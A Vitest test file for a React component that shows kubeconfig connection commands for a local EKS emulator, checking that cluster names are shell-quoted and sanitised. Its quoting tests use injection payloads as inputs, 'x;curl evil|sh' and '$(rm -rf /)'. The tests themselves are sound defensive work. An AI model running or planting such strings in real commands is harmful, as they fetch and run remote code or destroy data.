// @vitest-environment jsdom
import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { FlashbarProvider } from '../../../contexts/FlashbarProvider';
import { EmulatorStatusProvider } from '../../../contexts/EmulatorStatusProvider';
import { TEST_HEALTH, stubApiFetch } from '../../../test/fixtures';
import type { EksCluster } from '../api';
import { kubeconfigCommands, shellQuote } from './connectCommands';
import { ConnectLocally } from './ConnectLocally';

const CLUSTER: EksCluster = {
  name: 'localdeck-cluster',
  arn: 'arn:aws:eks:us-east-1:000000000000:cluster/localdeck-cluster',
  status: 'ACTIVE',
  version: '1.36',
  roleArn: 'arn:aws:iam::000000000000:role/eks-role',
  vpcConfig: {
    subnetIds: ['subnet-1'],
    securityGroupIds: [],
    endpointPublicAccess: true,
    endpointPrivateAccess: false,
    publicAccessCidrs: ['0.0.0.0/0'],
  },
  tags: [],
  raw: {},
};

describe('ConnectLocally shell quoting', () => {
  it('quotes shell metacharacters with single quotes', () => {
    expect(shellQuote('x;curl evil|sh')).toBe("'x;curl evil|sh'");
    expect(shellQuote("it's")).toBe("'it'\\''s'");
    expect(shellQuote('$(rm -rf /)')).toBe("'$(rm -rf /)'");
  });

  it('uses the sanitized file name and quotes endpoint/region', () => {
    const commands = kubeconfigCommands('x;curl evil|sh', 'http://localhost:4566', 'us-east-1');

    expect(commands).toContain("export KUBECONFIG=~/Downloads/'kubeconfig-x-curl-evil-sh.yaml'");
    expect(commands).not.toContain('x;curl evil|sh.yaml');
    expect(commands).toContain("AWS_REGION='us-east-1'");
    expect(commands).toContain("export AWS_ENDPOINT_URL='http://localhost:4566'");
  });

  it('falls back to a safe file name for unicode-only cluster names', () => {
    const commands = kubeconfigCommands('クラスター', 'http://127.0.0.1:4566', 'eu-west-1');

    expect(commands).toContain("export KUBECONFIG=~/Downloads/'kubeconfig-cluster.yaml'");
    expect(commands).toContain("export AWS_ENDPOINT_URL='http://127.0.0.1:4566'");
  });

  it('names the active provider in the command comments', () => {
    const commands = kubeconfigCommands('c', 'http://localhost:4566', 'us-east-1', 'MiniStack');

    expect(commands).toContain('# your MiniStack endpoint');
    expect(commands).toContain('# 2. Let the kubeconfig credential plugin reach the emulator');
  });
});

describe('ConnectLocally', () => {
  afterEach(() => {
    cleanup();
    vi.unstubAllGlobals();
  });

  it('renders the live endpoint and region from the status provider', async () => {
    stubApiFetch();
    render(
      <EmulatorStatusProvider>
        <FlashbarProvider>
          <ConnectLocally cluster={CLUSTER} />
        </FlashbarProvider>
      </EmulatorStatusProvider>,
    );

    // The status provider resolves /api/config and /api/health on mount; a
    // microtask flush is enough for the stubbed fetch to propagate.
    await new Promise((resolve) => setTimeout(resolve, 50));

    const pre = document.querySelector('pre');
    expect(pre?.textContent ?? '').toContain("export AWS_ENDPOINT_URL='http://localhost:4566'");
    expect(pre?.textContent ?? '').toContain("AWS_REGION='us-east-1'");
    expect(screen.getByRole('button', { name: 'Download kubeconfig' })).toBeDefined();
  });

  it('uses the provider label from the health document in the copy', async () => {
    const providerLabel = 'MiniStack';
    stubApiFetch({
      health: {
        ...TEST_HEALTH,
        provider: { ...TEST_HEALTH.provider, providerLabel },
        emulator: { ...TEST_HEALTH.emulator, providerLabel },
      },
    });
    render(
      <EmulatorStatusProvider>
        <FlashbarProvider>
          <ConnectLocally cluster={CLUSTER} />
        </FlashbarProvider>
      </EmulatorStatusProvider>,
    );

    expect(
      await screen.findByText(new RegExp(`${providerLabel} exposes the Kubernetes API`)),
    ).toBeDefined();
    expect(screen.getByText(new RegExp(`pinned to your ${providerLabel} endpoint`))).toBeDefined();
    expect(screen.getByText(`${providerLabel} EKS documentation`)).toBeDefined();
    const pre = document.querySelector('pre');
    expect(pre?.textContent ?? '').toContain(`# your ${providerLabel} endpoint`);
  });
});
